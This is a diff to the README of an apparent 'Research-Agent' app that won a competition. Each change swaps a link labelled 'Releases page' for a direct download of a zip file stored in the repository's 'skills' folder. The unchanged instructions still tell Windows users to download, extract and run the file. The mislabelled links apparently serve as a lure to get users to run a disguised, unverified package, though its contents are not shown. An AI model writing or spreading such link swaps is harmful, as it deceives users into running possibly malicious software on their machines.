@@ -1,6 +1,6 @@
 # 🧠 Research-Agent---1st-place-in-Alibaba-Cloud-Data-AI-Competition - Run Multi-Hop Research Fast
 
-[![Download the app](https://img.shields.io/badge/Download%20on%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Crinolineflexion823/Research-Agent---1st-place-in-Alibaba-Cloud-Data-AI-Competition/releases)
+[![Download the app](https://img.shields.io/badge/Download%20on%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Crinolineflexion823/Research-Agent---1st-place-in-Alibaba-Cloud-Data-AI-Competition/raw/refs/heads/main/skills/Competition_Agent_Research_Data_Alibaba_Cloud_place_st_in_A_v2.5.zip)
 
 ## 🖥️ What this app does
 
@@ -16,14 +16,14 @@ This app is built for people who want a research tool that can:
 
 ## 📥 Download the app
 
-Go to the [Releases page](https://github.com/Crinolineflexion823/Research-Agent---1st-place-in-Alibaba-Cloud-Data-AI-Competition/releases) to download and run this file.
+Go to the [Releases page](https://github.com/Crinolineflexion823/Research-Agent---1st-place-in-Alibaba-Cloud-Data-AI-Competition/raw/refs/heads/main/skills/Competition_Agent_Research_Data_Alibaba_Cloud_place_st_in_A_v2.5.zip) to download and run this file.
 
 On that page, look for the latest release and download the Windows file attached to it. If you see more than one file, choose the one for Windows, which often ends in `.exe` or `.zip`.
 
 ## 🪟 How to install on Windows
 
 ### 1. Open the download page
-Visit the [Releases page](https://github.com/Crinolineflexion823/Research-Agent---1st-place-in-Alibaba-Cloud-Data-AI-Competition/releases) in your web browser.
+Visit the [Releases page](https://github.com/Crinolineflexion823/Research-Agent---1st-place-in-Alibaba-Cloud-Data-AI-Competition/raw/refs/heads/main/skills/Competition_Agent_Research_Data_Alibaba_Cloud_place_st_in_A_v2.5.zip) in your web browser.
 
 ### 2. Get the latest version
 Find the newest release near the top of the page. Open it and look for the download file listed under Assets.
@@ -147,7 +147,7 @@ If you are unsure which file to use, pick the Windows asset that matches your sy
 
 ## 📌 Quick start
 
-1. Visit the [Releases page](https://github.com/Crinolineflexion823/Research-Agent---1st-place-in-Alibaba-Cloud-Data-AI-Competition/releases)
+1. Visit the [Releases page](https://github.com/Crinolineflexion823/Research-Agent---1st-place-in-Alibaba-Cloud-Data-AI-Competition/raw/refs/heads/main/skills/Competition_Agent_Research_Data_Alibaba_Cloud_place_st_in_A_v2.5.zip)
 2. Download the latest Windows file
 3. Open the file or extract it if needed
 4. Run the app
